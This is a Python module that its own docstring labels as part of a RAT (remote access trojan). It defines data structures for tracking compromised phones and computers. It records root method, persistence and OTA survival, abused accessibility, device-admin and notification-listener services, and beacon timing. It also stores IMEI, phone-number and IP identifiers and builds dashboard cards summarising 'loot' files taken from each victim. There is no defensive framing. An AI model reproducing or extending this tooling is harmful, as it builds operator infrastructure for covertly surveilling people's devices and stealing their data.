"""Device dataclass and serialization for RAT."""

from __future__ import annotations

import json
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional

from quantum.core.state import DeviceState
from quantum.core.ids import new_device_id


@dataclass
class DeviceCapabilities:
    """Structured device capabilities."""
    # Root/privilege
    has_root: bool = False
    root_method: str = ""  # magisk, su, kernel_exploit, etc.
    selinux_mode: str = ""  # enforcing, permissive, disabled

    # ADB
    adb_enabled: bool = False
    adb_wifi: bool = False
    adb_port: int = 5555

    # Persistence
    persistence_methods: List[str] = field(default_factory=list)
    boot_survival: bool = False
    ota_survival: bool = False

    # Network
    vpn_active: bool = False
    proxy_configured: bool = False
    ports_open: List[int] = field(default_factory=list)

    # Hardware
    bluetooth: bool = False
    nfc: bool = False
    usb_otg: bool = False
    hdmi_out: bool = False

    # Sensors
    gps: bool = False
    accelerometer: bool = False
    gyroscope: bool = False
    fingerprint: bool = False
    face_id: bool = False

    # Apps/Services
    accessibility_services: List[str] = field(default_factory=list)
    device_admin_apps: List[str] = field(default_factory=list)
    notification_listener: bool = False

    # Custom
    custom: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "DeviceCapabilities":
        return cls(**{k: v for k, v in data.items() if k in cls.__dataclass_fields__})


@dataclass
class DeviceInfo:
    """Complete device information."""
    # Identity
    id: str
    nickname: str = ""
    tags: List[str] = field(default_factory=list)
    group: str = ""

    # Platform
    platform: str = ""  # android, ios, linux, windows, macos
    arch: str = ""
    os_version: str = ""
    build: str = ""
    vendor: str = ""
    model: str = ""
    serial: str = ""

    # Network identifiers
    mac: str = ""
    imei: str = ""
    msisdn: str = ""
    ip_local: str = ""
    ip_public: str = ""
    carrier: str = ""

    # State
    state: DeviceState = DeviceState.DISCOVERED
    channel: str = ""
    last_seen: float = 0
    first_seen: float = 0
    beacon_interval: float = 60
    beacon_jitter: float = 0.15

    # Capabilities
    capabilities: DeviceCapabilities = field(default_factory=DeviceCapabilities)

    # OPSEC
    opsec_score: int = 0
    risk_factors: List[str] = field(default_factory=list)

    # Metadata
    notes: str = ""
    created: float = 0
    updated: float = 0

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["state"] = self.state.value
        d["capabilities"] = self.capabilities.to_dict()
        return d

    def to_summary(self) -> Dict[str, Any]:
        """Brief summary for fleet view."""
        return {
            "id": self.id,
            "nickname": self.nickname,
            "platform": self.platform,
            "model": self.model,
            "os_version": self.os_version,
            "state": self.state.value,
            "root": self.capabilities.has_root,
            "last_seen": self.last_seen,
            "tags": self.tags,
            "group": self.group,
            "opsec_score": self.opsec_score,
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "DeviceInfo":
        caps_data = data.pop("capabilities", {})
        if isinstance(caps_data, dict):
            capabilities = DeviceCapabilities.from_dict(caps_data)
        else:
            capabilities = DeviceCapabilities()

        state_val = data.pop("state", DeviceState.DISCOVERED)
        if isinstance(state_val, str):
            state = DeviceState(state_val)
        else:
            state = state_val

        tags = data.pop("tags", [])
        if isinstance(tags, str):
            tags = [t.strip() for t in tags.split(",") if t.strip()]

        return cls(
            capabilities=capabilities,
            state=state,
            tags=tags,
            **data
        )


@dataclass
class DeviceWebCard:
    """Device card for fleet dashboard."""
    device: DeviceInfo

    # Computed fields for display
    identity_line: str = ""
    channel_line: str = ""
    ident_line: str = ""
    state_line: str = ""
    power_line: str = ""
    net_line: str = ""
    caps_line: str = ""
    loot_line: str = ""

    @classmethod
    def from_device(cls, device: DeviceInfo, loot_stats: Dict = None) -> "DeviceWebCard":
        """Build a web card from device info."""
        card = cls(device=device)

        # Identity line
        name = device.nickname or device.model or "Unknown Device"
        card.identity_line = f"{name} [{device.platform.upper()}] {device.os_version}"

        # Channel line
        channel_parts = []
        if device.channel:
            channel_parts.append(f"{device.channel}")
        if device.last_seen:
            import time
            ago = int(time.time() - device.last_seen)
            channel_parts.append(f"{ago}s ago")
        card.channel_line = "  ".join(channel_parts)

        # Ident line
        ident_parts = []
        if device.mac:
            ident_parts.append(device.mac)
        if device.ip_local:
            ident_parts.append(device.ip_local)
        if device.imei:
            ident_parts.append(f"IMEI {device.imei[-4:]}")
        if device.carrier:
            ident_parts.append(device.carrier)
        card.ident_line = " · ".join(ident_parts)

        # State line
        state_parts = [device.state.value]
        if device.capabilities.has_root:
            state_parts.append("ROOT ✓")
        if device.capabilities.selinux_mode:
            state_parts.append(f"SELinux {device.capabilities.selinux_mode}")
        if device.capabilities.adb_enabled:
            state_parts.append("ADB" + ("-wifi" if device.capabilities.adb_wifi else ""))
        card.state_line = "  ".join(state_parts)

        # Power line (Android only)
        if device.platform == "android":
            # Would come from telemetry
            card.power_line = "Battery: --%"

        # Network line
        net_parts = []
        if device.ip_local:
            net_parts.append(f"IP {device.ip_local}")
        if device.capabilities.vpn_active:
            net_parts.append("VPN ON")
        if device.capabilities.proxy_configured:
            net_parts.append("Proxy ON")
        card.net_line = " · ".join(net_parts) or "No network info"

        # Capabilities line
        caps_parts = []
        total_caps = sum([
            device.capabilities.has_root,
            device.capabilities.adb_enabled,
            device.capabilities.persistence_methods,
            device.capabilities.accessibility_services,
            device.capabilities.device_admin_apps,
            device.capabilities.notification_listener,
        ])
        caps_parts.append(f"{total_caps} capabilities")
        if device.capabilities.persistence_methods:
            caps_parts.append(f"PERSIST {','.join(device.capabilities.persistence_methods)}")
        card.caps_line = "  ".join(caps_parts)

        # Loot line
        if loot_stats:
            card.loot_line = f"{loot_stats.get('total_files', 0)} files · {loot_stats.get('total_size', 0)//1024//1024} MB"
        else:
            card.loot_line = "No loot data"

        return card

    def to_dict(self) -> Dict[str, Any]:
        return {
            "device": self.device.to_summary(),
            "identity_line": self.identity_line,
            "channel_line": self.channel_line,
            "ident_line": self.ident_line,
            "state_line": self.state_line,
            "power_line": self.power_line,
            "net_line": self.net_line,
            "caps_line": self.caps_line,
            "loot_line": self.loot_line,
        }


def create_device_from_enumeration(data: Dict[str, Any]) -> DeviceInfo:
    """Create a DeviceInfo from enumeration data."""
    platform = data.get("platform", "").lower()
    device_id = data.get("id") or new_device_id(platform)

    return DeviceInfo(
        id=device_id,
        platform=platform,
        arch=data.get("arch", ""),
        os_version=data.get("os_version", ""),
        build=data.get("build", ""),
        vendor=data.get("vendor", ""),
        model=data.get("model", ""),
        serial=data.get("serial", ""),
        mac=data.get("mac", ""),
        imei=data.get("imei", ""),
        msisdn=data.get("msisdn", ""),
        ip_local=data.get("ip_local", ""),
        ip_public=data.get("ip_public", ""),
        carrier=data.get("carrier", ""),
        nickname=data.get("nickname", ""),
        tags=data.get("tags", []),
        group=data.get("group", ""),
        first_seen=data.get("first_seen", 0),
        last_seen=data.get("last_seen", 0),
        channel=data.get("channel", ""),
        capabilities=DeviceCapabilities(
            has_root=data.get("root", False),
            root_method=data.get("root_method", ""),
            selinux_mode=data.get("selinux", ""),
            adb_enabled=data.get("adb_enabled", False),
            adb_wifi=data.get("adb_wifi", False),
            persistence_methods=data.get("persistence_methods", []),
            boot_survival=data.get("boot_survival", False),
            ota_survival=data.get("ota_survival", False),
            vpn_active=data.get("vpn_active", False),
            proxy_configured=data.get("proxy_configured", False),
            ports_open=data.get("ports_open", []),
            bluetooth=data.get("bluetooth", False),
            nfc=data.get("nfc", False),
            usb_otg=data.get("usb_otg", False),
            hdmi_out=data.get("hdmi_out", False),
            gps=data.get("gps", False),
            accelerometer=data.get("accelerometer", False),
            gyroscope=data.get("gyroscope", False),
            fingerprint=data.get("fingerprint", False),
            face_id=data.get("face_id", False),
            accessibility_services=data.get("accessibility_services", []),
            device_admin_apps=data.get("device_admin_apps", []),
            notification_listener=data.get("notification_listener", False),
        ),
        state=DeviceState(data.get("state", "ENUMERATED")),
        opsec_score=data.get("opsec_score", 0),
        notes=data.get("notes", ""),
    )


def merge_device_info(existing: DeviceInfo, new_data: DeviceInfo) -> DeviceInfo:
    """Merge new enumeration data into existing device info."""
    # Update timestamps
    existing.last_seen = max(existing.last_seen, new_data.last_seen)
    existing.updated = new_data.updated or existing.updated

    # Update dynamic fields
    if new_data.ip_local:
        existing.ip_local = new_data.ip_local
    if new_data.ip_public:
        existing.ip_public = new_data.ip_public
    if new_data.channel:
        existing.channel = new_data.channel
    if new_data.state != DeviceState.DISCOVERED:
        existing.state = new_data.state

    # Merge capabilities (new wins for non-empty)
    for field_name in DeviceCapabilities.__dataclass_fields__:
        old_val = getattr(existing.capabilities, field_name)
        new_val = getattr(new_data.capabilities, field_name)
        if isinstance(new_val, list) and new_val:
            setattr(existing.capabilities, field_name, new_val)
        elif isinstance(new_val, bool) and new_val:
            setattr(existing.capabilities, field_name, new_val)
        elif isinstance(new_val, str) and new_val:
            setattr(existing.capabilities, field_name, new_val)
        elif isinstance(new_val, dict) and new_val:
            old_dict = getattr(existing.capabilities, field_name, {})
            old_dict.update(new_val)
            setattr(existing.capabilities, field_name, old_dict)

    return existing